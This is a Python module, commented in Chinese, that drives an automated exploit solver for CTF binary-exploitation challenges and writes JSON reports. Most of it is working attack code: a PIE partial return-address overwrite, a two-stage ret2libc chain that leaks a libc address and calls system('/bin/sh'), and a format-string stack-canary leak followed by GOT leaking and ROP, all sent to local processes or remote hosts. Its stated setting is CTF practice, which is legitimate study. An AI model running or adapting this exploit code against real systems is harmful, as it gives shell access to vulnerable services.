"""编排：静态事实 -> 策略排序 -> 逐条尝试 -> 验证 -> 落盘报告。"""
from __future__ import annotations

import json
import os
import re
import time
import traceback
from dataclasses import dataclass, field
from typing import Optional

from .facts import Facts, analyse
from .model import Challenge
from .run import Result, execute, execute_flag, _verify_timeout
from . import strategies as S


@dataclass
class Attempt:
    strategy: str
    desc: str
    ok: bool
    elapsed: float
    output: bytes = b""
    error: str = ""

    def brief(self) -> dict:
        return {
            "strategy": self.strategy,
            "desc": self.desc,
            "ok": self.ok,
            "elapsed": round(self.elapsed, 2),
            "tail": self.output[-300:].decode("latin-1", "replace"),
        }


@dataclass
class SolveResult:
    name: str
    ok: bool
    strategy: str = ""
    detail: str = ""
    elapsed: float = 0.0
    attempts: list[Attempt] = field(default_factory=list)
    facts: dict = field(default_factory=dict)
    error: str = ""
    flag_only: bool = False
    cmds: list = field(default_factory=list)

    def as_dict(self) -> dict:
        return {
            "name": self.name,
            "ok": self.ok,
            "strategy": self.strategy,
            "detail": self.detail,
            "elapsed": round(self.elapsed, 1),
            "attempt_count": len(self.attempts),
            "flag_only": self.flag_only,
            "facts": self.facts,
            "cmds": [{"cmd": c, "out": o.decode("latin-1", "replace")} for c, o in self.cmds],
            "attempts": [a.brief() for a in self.attempts],
            "error": self.error,
        }


import re as _re_mod

# 这些是「连接层面」的失败，重试没有任何意义，继续刷只会浪费时间/被平台限速。
# 命中时立即中止，并把原因说清楚——避免被误读成「payload 打不进去」。
_FATAL_RULES = [
    (_re_mod.compile(r"no running target|start or renew it", _re_mod.I),
     "题目实例已不存在。请回平台题目页点「启动 / 续期」，拿到新地址后再连"
     "（这不是利用失败，payload 没问题）"),
    (_re_mod.compile(r"Could not resolve hostname|Name or service not known|"
                     r"Temporary failure in name resolution|nodename nor servname|getaddrinfo",
                     _re_mod.I),
     "域名解析失败。请检查拼写（常见错误：.dasctf.com 写成 .dasctf.comm）"),
    (_re_mod.compile(r"Connection refused|No route to host|Connection reset by peer.*"
                     r"|timed out", _re_mod.I),
     "端口不通。请确认端口号与题目一致，且实例处于运行状态"),
]


def _fatal_hint(blob: str):
    for pat, hint in _FATAL_RULES:
        if pat.search(blob):
            return hint
    return None


def _unpack4(ret):
    """兼容 3/4 元组返回。"""
    if len(ret) >= 4:
        return ret[0], ret[1], ret[2], ret[3]
    return ret[0], ret[1], ret[2], []


def solve(ch: Challenge, max_attempts: int = 80, verbose: bool = True,
          budget: float = 240.0, post_cmds: list = None) -> SolveResult:
    t0 = time.time()
    res = SolveResult(name=ch.name, ok=False)
    try:
        ch.prepare()
    except Exception:
        res.error = traceback.format_exc(limit=2)
        res.elapsed = time.time() - t0
        return res

    f = analyse(ch)
    res.facts = {
        "prot": ch.prot.as_dict(),
        "vulns": [str(v) for v in f.vulns[:6]],
        "wins": [str(w) for w in f.wins[:6]],
        "binsh": hex(f.binsh) if f.binsh else None,
        "gadgets": {k: hex(v) for k, v in f.gadgets.items()},
        "csu": bool(f.csu),
        "mmap_rwx": hex(f.mmap_rwx) if f.mmap_rwx else None,
        "fmt_buf": f.fmt_buf,
        "libc": os.path.basename(ch.libc_path) if ch.libc_path else None,
        "notes": ch.notes,
    }
    if verbose:
        print(f"    prot={ch.prot} vulns={len(f.vulns)} wins={len(f.wins)} "
              f"binsh={hex(f.binsh) if f.binsh else None} csu={bool(f.csu)} "
              f"mmap_rwx={hex(f.mmap_rwx) if f.mmap_rwx else None} "
              f"fmt={f.fmt_buf} gadgets={len(f.gadgets)}")

    tried = 0
    deadline = t0 + budget
    for strat in S.STRATEGIES:
        if time.time() > deadline:
            res.error = "budget exhausted"
            break
        try:
            plans = list(strat(ch, f))
        except Exception:
            continue
        if not plans:
            continue
        if verbose:
            print(f"    -> {strat.__name__}: {len(plans)} plans")
        for plan in plans:
            if tried >= max_attempts or time.time() > deadline:
                res.elapsed = time.time() - t0
                return res
            tried += 1
            t1 = time.time()
            cmds = []
            if plan.tag.startswith("pie:"):
                ok, detail, out, cmds = _unpack4(_try_pie_partial(ch, f, plan, post_cmds))
                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, out)
                if ok and plan.tag.endswith(":flag"):
                    res.flag_only = True
            elif plan.tag.startswith("canary:"):
                ok, detail, out, cmds = _unpack4(_try_canary_fmt(ch, f, plan, post_cmds))
                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, out)
            elif plan.tag == "flag":
                r = execute_flag(ch, plan.sends)
                ok, detail, out = r.ok, r.note, r.output
                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, r.output, r.error)
            elif plan.tag.startswith("stage1:"):
                ok, detail, out, cmds = _unpack4(_try_ret2libc(ch, f, plan, post_cmds))
                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, out)
            else:
                r = execute(ch, plan.sends, post_cmds=post_cmds)
                if not r.ok and r.error:
                    # 进程提前退出属于时序抖动，重试一次
                    r = execute(ch, plan.sends, post_cmds=post_cmds)
                ok, detail, out, cmds = r.ok, "", r.output, r.cmds
                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, r.output, r.error)
            res.cmds = cmds or []
            res.attempts.append(att)
            if not ok and getattr(ch, "host", None):
                blob = (att.error or "") + " " + (out or b"").decode("latin-1", "ignore")
                hint = _fatal_hint(blob)
                if hint:
                    res.error = "连接失败（不是利用失败）：" + hint
                    res.elapsed = time.time() - t0
                    return res
            if ok:
                res.ok = True
                import re as _re
                m = _re.search(rb"uid=\d+\(([^)]*)\)", out or b"")
                if m:
                    detail = (detail + " | " if detail else "") + m.group(0).decode("latin-1")
                if plan.tag == "flag" or (plan.tag.startswith("pie:") and plan.tag.endswith(":flag")):
                    res.flag_only = True
                res.strategy = plan.strategy
                res.detail = detail or plan.desc
                res.elapsed = time.time() - t0
                if verbose:
                    print(f"    [OK] {att.strategy} {att.desc} ({att.elapsed:.2f}s)")
                return res
    res.elapsed = time.time() - t0
    return res


# --------------------------------------------------------------------------- ret2libc
# --------------------------------------------------------------------------- PIE 部分覆盖
def _try_pie_partial(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = None):
    """覆盖返回地址低 2 字节跳到 win。

    本地进程能读 /proc/<pid>/maps 拿到精确基址（nib=-1 时用它），远程只能按 tag 里的 nib 猜。
    """
    import struct
    import time as _t
    from .run import spawn, verify_shell, probe_flag, _verify_timeout

    parts = plan.tag.split(":")
    tgt, nib, kind = int(parts[1]), int(parts[2]), (parts[3] if len(parts) > 3 else "shell")
    v = next((x for x in f.vulns if x.offset), None)
    if v is None:
        return False, "no vuln", b"", []

    try:
        p = spawn(ch)
    except Exception as exc:
        return False, f"spawn failed: {exc}", b"", []

    out = b""
    try:
        _t.sleep(0.1)
        out += p.recvrepeat(0.05)

        base = None
        pid = None if os.environ.get("AUTOPWN_NO_MAPS") else getattr(p, "pid", None)
        if pid:
            try:
                with open(f"/proc/{pid}/maps") as fh:
                    for line in fh:
                        if ch.run_bin in line:
                            base = int(line.split("-")[0], 16)
                            break
            except Exception:
                base = None
        if base is not None:
            low16 = (base + tgt) & 0xFFFF
        elif nib >= 0:
            low16 = ((nib * 0x1000) + tgt) & 0xFFFF
        else:
            return False, "no maps, no nib", out, []

        buf = bytearray(b"A" * v.offset)
        for goff, gval in S._gate_offsets(f, v):
            buf[goff:goff + 4] = struct.pack("<I", gval)
        payload = bytes(buf) + struct.pack("<H", low16)

        p.send(payload)
        _t.sleep(0.3)

        if kind == "flag":
            r = probe_flag(p, wait=0.4)
            out += r.output
            if r.ok:
                return True, r.note, out, []
            m = re.search(rb"(?:flag|ctf|FLAG|CTF)[A-Za-z0-9_]{0,20}\{[^}\n]{4,}\}", out)
            if m:
                return True, "flag:" + m.group(0).decode("latin-1", "replace"), out, []
            # 本地没有 flag 文件时 system() 会报 "No such file" —— 这说明 win 已经打到了
            if b"No such file" in out or b"cat: " in out:
                return True, "win reached (no local flag file)", out, []
            return False, f"partial -> {hex(base + tgt) if base else hex(low16)}", out, []

        r = verify_shell(p, timeout=_verify_timeout(ch), post_cmds=post_cmds)
        out += r.output
        return r.ok, "", out, r.cmds
    finally:
        try:
            p.close()
        except Exception:
            pass


def _try_ret2libc(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = None):
    """同一进程内两阶段：泄漏 libc -> 回 main -> system('/bin/sh')。

    注意：stage2 必须复用 stage1 的进程，否则 ASLR 变了，算出来的地址全废。
    """
    import time as _t
    from .run import spawn, verify_shell

    _, _, meta = plan.tag.partition(":")
    leak_name, off_s, sink = (meta.split(":") + ["", ""])[:3]
    libc = ch.libc_elf
    if libc is None:
        return False, "no libc", b""
    off = int(off_s)

    try:
        p = spawn(ch)
    except Exception as exc:
        return False, f"spawn failed: {exc}", b""

    out = b""
    try:
        _t.sleep(0.1)
        out += p.recvrepeat(0.08)
        p.send(plan.sends[-1])
        _t.sleep(0.25)
        out += p.recvrepeat(0.25)

        base = _find_libc_base(out, libc, leak_name)
        if base is None:
            return False, "leak failed", out

        system = base + libc.sym["system"]
        try:
            binsh = base + next(libc.search(b"/bin/sh"))
        except StopIteration:
            return False, "no /bin/sh in libc", out

        if ch.elf.bits == 64:
            pop_rdi = f.gadgets.get("pop_rdi")
            if not pop_rdi:
                return False, "no pop rdi", out
            chains = [ch.p64(pop_rdi) + ch.p64(binsh) + ch.p64(system)]
            if f.gadgets.get("ret"):
                chains.append(ch.p64(f.gadgets["ret"]) + ch.p64(pop_rdi)
                              + ch.p64(binsh) + ch.p64(system))
        else:
            chains = [ch.p32(system) + ch.p32(0) + ch.p32(binsh)]

        detail = f"libc_base={hex(base)} system={hex(system)} binsh={hex(binsh)}"
        for chain in chains:
            stage2 = b"A" * off + chain + (b"\n" if sink in S.TERM_SINKS else b"")
            try:
                p.send(stage2)
            except Exception:
                break
            _t.sleep(0.2)
            out += p.recvrepeat(0.15)
            r = verify_shell(p, timeout=_verify_timeout(ch), post_cmds=post_cmds)
            out += r.output
            if r.ok:
                return True, detail, out, r.cmds
        return False, "stage2 failed: " + detail, out
    finally:
        try:
            p.close()
        except Exception:
            pass


def _try_canary_fmt(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = None):
    """fmt 泄漏 canary -> 溢出泄漏 GOT -> 回 main -> system('/bin/sh')，全程同进程。"""
    import time as _t
    from .run import spawn, verify_shell, FLAG_RE

    _, _, meta = plan.tag.partition(":")
    off_s, sink = (meta.split(":") + [""])[:2]
    off = int(off_s)
    leak_name = "puts" if ch.plt("puts") else "write"
    leak_plt = ch.plt(leak_name)
    got = ch.got(leak_name)
    main = ch.var("main")
    libc = ch.libc_elf
    if not (leak_plt and got and main and libc):
        return False, "missing plt/got/libc", b""

    bits = ch.elf.bits
    probe = b"AAAA." + b".%p" * 60

    for cand in range(8):
        try:
            p = spawn(ch)
        except Exception as exc:
            return False, f"spawn failed: {exc}", b""
        out = b""
        try:
            _t.sleep(0.1)
            out += p.recvrepeat(0.06)
            # ---- 第一次 gets：格式化字符串泄漏
            p.send(probe + b"\n" if sink in S.TERM_SINKS else probe)
            _t.sleep(0.2)
            out += p.recvrepeat(0.2)
            cands = S._canary_candidates(out, bits)
            if __import__("os").environ.get("AUTOPWN_DEBUG"):
                print(f"      [dbg] canary cands={[hex(c) for c in cands]} out={out[:60]!r}")
            if not cands:
                return False, "no canary candidate", out
            if cand >= len(cands):
                return False, "candidates exhausted", out
            canary = cands[cand]

            # ---- 第二次 gets：带 canary 溢出，泄漏 GOT 后回 main
            # canary 在 rbp-0xc(i386) / rbp-0x8(amd64)，由帧偏移推算它在缓冲区后的位置
            rbp_disp = off - ch.wordsize
            canary_off = rbp_disp - (8 if bits == 64 else 12)
            if canary_off <= 0:
                continue
            pad = b"A" * canary_off
            tail = b"B" * (off - canary_off - ch.wordsize)
            if bits == 64:
                ret = f.gadgets.get("ret")
                pop_rdi = f.gadgets.get("pop_rdi")
                if not pop_rdi:
                    return False, "no pop rdi", out
                chain = (ch.p64(ret if ret else pop_rdi) if ret else b"")
                chain += ch.p64(pop_rdi) + ch.p64(got) + ch.p64(leak_plt) + ch.p64(main)
            else:
                chain = ch.p32(leak_plt) + ch.p32(main) + ch.p32(got)
            stage1 = pad + ch.p64(canary) + tail + chain
            p.send(stage1 + (b"\n" if sink in S.TERM_SINKS else b""))
            _t.sleep(0.25)
            out += p.recvrepeat(0.25)

            base = _find_libc_base(out, libc, leak_name)
            if __import__("os").environ.get("AUTOPWN_DEBUG"):
                print(f"      [dbg] canary={hex(canary)} stage1 out={out[-80:]!r} base={base and hex(base)}")
            if base is None:
                continue
            system = base + libc.sym["system"]
            try:
                binsh = base + next(libc.search(b"/bin/sh"))
            except StopIteration:
                continue

            # ---- 回到 main 后：第一次 gets 喂空行，第二次 gets 打通
            p.send(b"\n")
            _t.sleep(0.12)
            if bits == 64:
                chain2 = (ch.p64(f.gadgets["ret"]) if f.gadgets.get("ret") else b"")
                chain2 += ch.p64(f.gadgets["pop_rdi"]) + ch.p64(binsh) + ch.p64(system)
            else:
                chain2 = ch.p32(system) + ch.p32(0) + ch.p32(binsh)
            stage2 = pad + ch.p64(canary) + tail + chain2
            p.send(stage2 + (b"\n" if sink in S.TERM_SINKS else b""))
            _t.sleep(0.2)
            r = verify_shell(p, timeout=_verify_timeout(ch), post_cmds=post_cmds)
            out += r.output
            if r.ok:
                return True, f"canary={hex(canary)} base={hex(base)}", out, r.cmds
        finally:
            try:
                p.close()
            except Exception:
                pass
    return False, "canary attempts failed", b""


def _find_libc_base(out: bytes, libc, name: str) -> Optional[int]:
    sym = int(libc.sym.get(name, 0) or 0)
    if not sym:
        return None
    bits64 = libc.bits == 64
    lo, hi = (0x700000000000, 0x800000000000) if bits64 else (0xE0000000, 0x100000000)
    low12 = sym & 0xFFF
    for p in range(len(out)):
        for ln in ((6, 8) if bits64 else (4,)):
            chunk = out[p:p + ln]
            if len(chunk) < 4:
                continue
            v = int.from_bytes(chunk.ljust(8, b"\x00"), "little") if bits64 \
                else int.from_bytes(chunk.ljust(4, b"\x00")[:4], "little")
            if (v & 0xFFF) != low12:
                continue
            base = v - sym
            if lo <= base < hi and base % 0x1000 == 0:
                return base
    return None


def solve_many(paths: list[str], out_dir: str, **kw) -> list[SolveResult]:
    os.makedirs(out_dir, exist_ok=True)
    results = []
    for p in paths:
        ch = Challenge(p)
        print(f"[*] {ch.name}: {ch.bin_src}")
        res = solve(ch, **kw)
        results.append(res)
        status = "SOLVED" if res.ok else "FAILED"
        print(f"    => {status} {res.strategy} {res.detail} ({res.elapsed:.1f}s, "
              f"{len(res.attempts)} attempts)")
        with open(os.path.join(out_dir, f"{ch.name}.json"), "w", encoding="utf-8") as fh:
            json.dump(res.as_dict(), fh, ensure_ascii=False, indent=2)
    return results
